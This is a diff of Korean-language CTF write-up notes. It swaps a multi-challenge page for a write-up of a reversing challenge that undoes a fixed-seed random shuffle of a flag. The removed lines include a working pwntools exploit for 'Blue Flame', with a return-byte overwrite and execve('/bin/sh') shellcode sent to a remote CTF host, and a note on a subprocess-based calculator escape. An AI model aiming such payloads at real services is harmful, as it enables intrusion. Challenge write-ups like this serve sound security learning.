@@ -1,81 +1,61 @@
+# 키워드
+- 알고리즘
+- 램덤시드
 
-
-
-
-| 문제제목 | 부분 | 상태 |
-| ---- | ---- | ---- |
-| [[Mine sweeper]] | WEB | SOLVED |
-| [[ImageStrorage]] | WEB | SOLVED |
-| [[이 웹사이트 비밀번호 인증이 이상하다..]] | WEB | SOLVED |
-| [[I’am not a bot]] | WEB | SOLVED |
-| [[discord-py]] | MISC | SOLVED |
-| [[discord-py revenge]] | MISC | SOLVED |
-| [[MIC check]] | MISC | SOLVED |
-| [[Baby Crypto]] | CRYPTO | SOLVED |
-| [[one_shot]] | PWN | SOLVED |
-| [[Blue Flame]] | PWN | SOLVED |
-| [[Defeat him]] | PWN | UNSOLVED |
-| [[Incubator Baby Rev]] | Reversing | SOLVED |
-| [[숨긴 암호 찾기!]] | Forensic | SOLVED |
-| [[금고 안에 숨긴 암호 찾기]] | Forensic | SOLVED |
-
-
-
-
-
-
-
-
-
-# Mic check
-파이썬을 이용해 계산기를 구현하였음.
-여러가지 필터링이 있었지만 아래와 같이 코드 스니펫을 입력하면 flag를 얻을 수 있음 
-![[스크린샷 2023-12-21 115442.png]]
-
-파이썬 내부에서 서브프로세스 모듈을 이용해 flag를 출력하는 명령어 실행 결과를 다시 출력함
-
-
-
-
-
-
-
-# Blue Flame
-리턴주소를 완벽히 변조할 수는 없어도 마지막 한바이트는 변조할 수 있음을 이용해 아래와 같이 패이로드를 보낼 수 있음
+---
+# 문제 배경
+- 해당 문제의 소스코드를 보면 random을 이용해 flag값을 섞은 후, 섞은 값을 shuffled_flag.txt에 저장 후 유저에게 주어진다.
+- 이때, `seed` 값이 고정이 되어 있으므로 섞는 순서는 고정이 되고, 전부 섞였을 때, index 번호만 알 수 있다면, 복호화가 가능하다.
 
 ```python
-from pwn import *
+import random
 
-#p=process("./blue-flame")
-#p=gdb.debug("./blue-flame")
-#p=remote("host3.dreamhack.games", 14505)
-p=remote("kknock.org", 10007)
-context.log_level="debug"
+def make_fake_flag() :
+    flag = "KCTF{"
+    flag += "X" * (1024 - 6)
+    flag += "}"
+    return flag
 
-shellcode=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+def reaplce_2_real_flag(flag):
+    list_flag = [a for a in flag]
+    flag = list_flag
+    for i in range(len(flag)):
+        if flag[i] == "X":
+            flag[i] = hex(random.randint(0,15))[2:]
+    return flag
 
-p.recvline()
-p.recvuntil(b'0x')
-buf=int(p.recv(8),16)
+def random_shuffle(flag,seed) :
+    random.seed(seed)
+    rand = random.randint(70,90)
+    for _ in range(rand):
+        random.seed(seed)
+        random.shuffle(flag)
 
-nonce=(buf-4)&0xff
-nonce=nonce.to_bytes(1,byteorder='little')
+    return "".join(flag)
+        
 
-payload=p32(buf+4)
-payload+=shellcode.rjust(0x34,b'a')
-payload+=nonce
+if __name__ == "__main__" :
+    print("[+] yeonwoo is shuffling flag ^-^")
+    flag = make_fake_flag()
+    flag = reaplce_2_real_flag(flag)
+    with open("./real_flag.txt","w") as f :
+        f.write(''.join(flag))
+        f.close()
+        
+    flag = random_shuffle(flag,31208)
 
-p.send(payload)
+    formats = "KCTF{}"
 
-p.interactive()
+    with open("./shuffled_flag.txt","w") as f :
+        f.writelines(flag)
+        f.close()
 
-# KCTF{Th15_15_r34l_f14g_h4h4}
+    print("[+] done! can you find the real flag? ^-^")
 ```
 
-
-
-# Incubator Baby Rev
-역산이 어려움을 이용하여 섞는 순서자체를 기억하여 문제를 해결하였음
+---
+# 풀이과정
+- 역산이 어렵지만, 섞는 순서자체를 기억하여 문제를 해결하였음
 
 
 ```python
@@ -112,3 +92,31 @@ if __name__ == "__main__":
 ```
 
 
+---
+# 다른 풀이(n0paew)
+
+```python
+import random
+
+def reverse_shuffle(shuffled_flag, seed):
+    random.seed(seed)
+    rand = random.randint(70, 90)
+    indices = list(range(len(shuffled_flag)))
+    for _ in range(rand):
+        random.seed(seed)
+        random.shuffle(indices)
+    
+    index = {}
+    for i, j in zip(shuffled_flag, indices):
+        index[j] = i
+    flag = [index[i] for i in range(len(index.keys()))]
+    return "".join(flag)
+
+shuffled_flag = "56f8724879703bfc1395f49dcdcdced10aF1da322cf986a11103c53126a47cc24deab0c311bb5d257c29895e423824812e0bc5a5f3b46f5b5f97ccb4920b9b2495e155c1e9e89956f11986c799ac136dd6bebc17e390e52cd60a53d5c6e7c04859634720b1a5e3423d1feab1021b2e8a0dfb52664ee311d2379410995c13d74f79eef3761c0eebde0ce372ee6f38b309fcf2eba2bab4434b4b179a71T31b4b4042dea51c75492a76921254a9b0dc9c308ac154bfa48ebbd7078bc10834f50632c4f70f71e36bd724f02e89c4aceda02f7d0ade9824a14da71a68c3adf84750ba5b2b4df6d7d970057f7880f7490014dd6dfe327e002967b89c12e69d39cdebd32e0b543067ff4f530cbf7d33c29076Kebcc8a2c95d51b8bdd394a3523a7680df{5abe589c25d974039ebf05101115c61347501eff833072312cd1dc47dfb3d040434d425d5fa9eb534688c06b598f180c70f816015b88d778d6d0203280b8b02630c15934431cdcf7a201d9dabe77339b66d9dfcb536aa6093d15ab19901e07244027C7403c3e05d2f27b2991786b9d370d984e7c3a39736383a350a680f0069cb60172b7e6ae4c12d101a0593066f10f4064f07f2a3bc9e944a35d7beface954fde05d720e1dd1659ca0c1a3a4ebd8f7dd0ba02d936acb6db86d15c38e5a0900f9e2e8bae878da4d8d962b5461cb7e6}d7f427554bbec7bfc3f3c998c5e5d71"
+
+original_seed = 31208
+
+original_flag = reverse_shuffle(list(shuffled_flag), original_seed)
+
+print(original_flag)
+```
